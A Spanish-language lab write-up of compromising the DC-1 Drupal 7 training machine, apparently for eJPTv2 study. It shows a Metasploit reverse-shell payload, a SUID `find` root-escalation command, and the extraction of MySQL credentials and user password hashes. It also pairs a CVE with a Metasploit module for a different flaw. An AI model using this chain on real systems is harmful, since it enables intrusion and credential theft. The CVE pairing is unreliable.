# 🕸️ Informe de Pentesting: DC-1 (Drupal 7)
**IP:** 192.168.1.37 | **Fecha:** 16/04/2026 | **Objetivo:** Preparación eJPTv2

## 🔍 Fase 1: Enumeración
- **Escaneo Nmap:** `nmap -sV -p- 192.168.1.37`
- **Puertos relevantes:** 80 (Apache/Drupal 7), 22 (SSH).
- **whatweb:** Confirmado Drupal 7.

## 💥 Fase 2: Explotación
- **Vulnerabilidad:** Drupalgeddon (CVE-2014-3704).
- **Herramienta:** Metasploit (`exploit/unix/webapp/drupal_drupalgeddon2`).
- **Payload:** `php/meterpreter/reverse_tcp`.
- **Resultado:** Shell de Meterpreter como `www-data`.

## 🚀 Fase 3: Escalada de Privilegios
- **Técnica:** Explotación de binario SUID.
- **Binario vulnerable:** `/usr/bin/find`.
- **Comando:** `find / -name "flag1.txt" -exec /bin/sh \; 2>/dev/null`
- **Resultado:** Shell de **root**.

## 🚩 Fase 4: Post-Explotación y Flags

### Flag 1
- **Ubicación:** Descubierta durante la búsqueda con `find`.
- **Contenido:** Pista sobre archivos de configuración de CMS.

### Flag 2
- **Ubicación:** `/var/www/sites/default/settings.php`
- **Contenido:** Credenciales MySQL (`dbuser:R0ck3t`).

### Flag 3
- **Ubicación:** Base de datos `drupaldb`, tabla `users`.
- **Comando:** `mysql -u dbuser -p'R0ck3t' -e "USE drupaldb; SELECT name, pass FROM users;"`
- **Hashes obtenidos:**
  - `admin`: `$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR`
  - `Fred`: `$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg`

### Flag 4 (Final)
- **Ubicación:** `/root/thefinalflag.txt`
- **Contenido:** Mensaje de felicitación del creador `@DCAU7`.

## 🧠 Lecciones Aprendidas
1. Drupal 7 sin parchear es extremadamente vulnerable a Drupalgeddon.
2. Los binarios SUID (`find`) son vectores de escalada críticos en Linux.
3. Los archivos de configuración de CMS (`settings.php`) contienen credenciales de base de datos.
4. La post-explotación incluye extraer hashes de usuarios para posibles ataques de cracking.

---
*Máquina completada al 100%. Evidencias en la carpeta `screenshots/`.*